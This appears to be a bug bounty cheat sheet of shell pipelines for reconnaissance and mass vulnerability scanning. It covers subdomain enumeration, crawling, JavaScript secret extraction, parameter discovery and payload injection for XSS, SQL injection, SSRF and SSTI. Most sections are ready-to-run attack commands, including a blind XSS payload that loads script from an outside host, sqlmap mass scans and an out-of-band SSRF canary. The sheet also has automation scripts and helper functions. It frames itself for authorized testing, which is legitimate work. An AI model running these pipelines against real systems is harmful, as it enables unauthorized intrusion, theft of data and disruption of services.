

> ⚠️ Use only on authorized targets (Bug Bounty / Lab environments).

---

## Table of Contents
- Recon & Subdomains
- Live Host Detection
- Crawling & URL Collection
- JavaScript Recon
- Parameter Discovery
- XSS
- SQL Injection
- SSRF & SSTI
- Content Discovery
	- Automation Scripts

---

## Recon & Subdomain Enumeration

```bash
subfinder -d target.com -all -silent > subs.txt
assetfinder -subs-only target.com >> subs.txt
amass enum -passive -d target.com >> subs.txt
sort -u subs.txt -o subs.txt
```

---

## Live Host Detection

```bash
cat subs.txt | httpx-toolkit -silent -status-code -title -tech-detect -follow-redirects > alive.txt
```

---

## Crawling & URL Collection

### Katana
```bash
katana -u https://target.com -d 5 -jc -kf all -silent > katana.txt
```

### Wayback + GAU
```bash
waybackurls target.com > wayback.txt
gau target.com > gau.txt
cat wayback.txt gau.txt | sort -u > urls.txt
```

### Hakrawler
```bash
echo target.com | hakrawler -d 5 -subs -u > hakrawler.txt
```

---

## JavaScript Recon

```bash
cat alive.txt | katana -d 5 -jc -silent | grep -iE "\.js$" | sort -u > js.txt
```

### Extract Secrets from JS
```bash
cat js.txt | httpx-toolkit -silent -sr -srd js_files/
```

### Scan JS with Nuclei
```bash
nuclei -l js.txt -t exposures/
```

---

## Parameter Discovery

### ParamSpider
```bash
paramspider -d target.com -o params.txt
```

### X8 (Hidden Params)
```bash
cat alive.txt | xargs -I@ x8 -u @ -w params.txt
```

---

## XSS Testing

### Dalfox Pipeline
```bash
cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe
```

### Blind XSS
```bash
cat urls.txt | gf xss | qsreplace '"><script src=https://xss.report/c/YOURID></script>' | httpx -silent
```

---

## SQL Injection

### SQLMap Mass Scan
```bash
cat urls.txt | gf sqli | uro > sqli.txt
sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
```

### Time-Based SQLi Test
```bash
cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -timeout 10
```

---

## SSRF

```bash
cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
```

---

## SSTI

```bash
cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49"
```

---

## Content Discovery

### ffuf
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac
```

### feroxbuster
```bash
feroxbuster -u https://target.com -w wordlist.txt -d 5
```

---

## Automation Script

```bash
#!/bin/bash
domain=$1
mkdir -p $domain && cd $domain

subfinder -d $domain -silent > subs.txt
assetfinder -subs-only $domain >> subs.txt
sort -u subs.txt -o subs.txt

cat subs.txt | httpx -silent > alive.txt
cat alive.txt | waybackurls > urls.txt
```

---

## Bash Helper Functions

```bash
recon() {
  subfinder -d $1 -silent | anew subs.txt
  assetfinder -subs-only $1 | anew subs.txt
  cat subs.txt | httpx -silent | anew alive.txt
}

xscan() {
  echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe
}

sqscan() {
  echo $1 | waybackurls | gf sqli | uro | qsreplace "'" | httpx -silent
}
```

---

## Notes
- Combine tools for better results
- Always validate findings manually
- Respect program scope & rules

--- 
